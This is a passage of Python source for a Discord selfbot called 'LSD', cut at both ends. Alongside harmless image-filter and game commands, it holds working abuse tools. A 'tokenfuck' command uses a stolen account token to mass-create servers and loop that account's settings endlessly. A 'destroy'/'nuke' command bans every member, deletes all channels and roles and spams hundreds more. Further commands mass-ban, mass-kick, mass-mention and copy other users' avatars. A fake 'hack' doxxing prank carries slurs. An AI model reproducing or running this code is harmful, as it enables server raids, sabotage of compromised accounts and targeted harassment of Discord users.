            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_blur.png"))
        except:
            await ctx.send(endpoint)


@LSD.command(aliases=["pixel"])
async def pixelate(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_blur.png"))
        except:
            await ctx.send(endpoint)


@LSD.command()
async def supreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_supreme.png"))
    except:
        await ctx.send(endpoint)


@LSD.command()
async def darksupreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_dark_supreme.png"))
    except:
        await ctx.send(endpoint)


@LSD.command(aliases=["facts"])
async def fax(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_facts.png"))
    except:
        await ctx.send(endpoint)


@LSD.command(aliases=["blurp"])
async def blurpify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_blurpify.png"))
        except:
            await ctx.send(res['message'])


@LSD.command()
async def invert(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/invert?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)


@LSD.command()
async def gay(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/gay?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)


@LSD.command()
async def communist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/communist?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)


@LSD.command()
async def snow(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/snow?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)


@LSD.command(aliases=["jpeg"])
async def jpegify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/jpegify?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_invert.png"))
        except:
            await ctx.send(endpoint)


@LSD.command(aliases=["pornhublogo", "phlogo"])
async def pornhub(ctx, word1=None, word2=None):
    await ctx.message.delete()
    if word1 is None or word2 is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace("{text-1}", word1).replace(
        "{text-2}", word2)
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)


@LSD.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])


@LSD.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@LSD.command()
async def hack(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")


@LSD.command(aliases=["reversesearch", "anticatfish", "catfish"])
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@LSD.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.LSDSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@LSD.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)


@LSD.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=1)


@LSD.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)


@LSD.command(name='1337speak', aliases=['leetspeak'])
async def _1337_speak(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
        .replace('E', '3').replace('i', '!').replace('I', '!') \
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'{text}')


@LSD.command()
async def ghost(ctx):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await LSD.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
            except discord.HTTPException as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@LSD.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
            r = requests.get(user.avatar_url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                await LSD.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@LSD.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
async def _set_pfp(ctx, *, url):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
            r = requests.get(url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png').convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await LSD.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@LSD.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"{qa}\nor\n{qb}")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")


@LSD.command()
async def topic(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)


@LSD.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    await ctx.send(f"{user}'s Dick size\n8{dong}D")


@LSD.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@LSD.command(aliases=['tokenfucker', 'disable'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "LSD",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@LSD.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
async def fakenet(ctx, _type=None, *, name=None):
    await ctx.message.delete()
    if _type is None or name is None:
        await ctx.send("missing parameters")
        return
    ID = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'lol']
    payload = {
        'name': name,
        'visibility': 1
    }
    token = config.get('token')
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
    }

    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after=3)
        return
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}',
                     data=json.dumps(payload), headers=headers)
    if r.status_code == 200:
        await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
    else:
        await ctx.send(
            '**[ERROR]** `LSD Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')

    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)


@LSD.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await LSD.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in LSD.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@LSD.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
        "msg:", "")
    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
        "1:", "")
    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
    message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
    await message.add_reaction('🅰')
    await message.add_reaction('🅱')


@LSD.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)


@LSD.command(aliases=["rekt", "nuke"])
async def destroy(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="LSD LOL",
            reason="LSD LOL",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="LSD")
    for _i in range(250):
        await ctx.guild.create_role(name="LSD", color=RandomColor())


@LSD.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="LSD")
        except:
            pass


@LSD.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@LSD.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="LSD")
        except:
            pass


@LSD.command(aliases=["spamroles"])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="LSD", color=RandomColor())
        except:
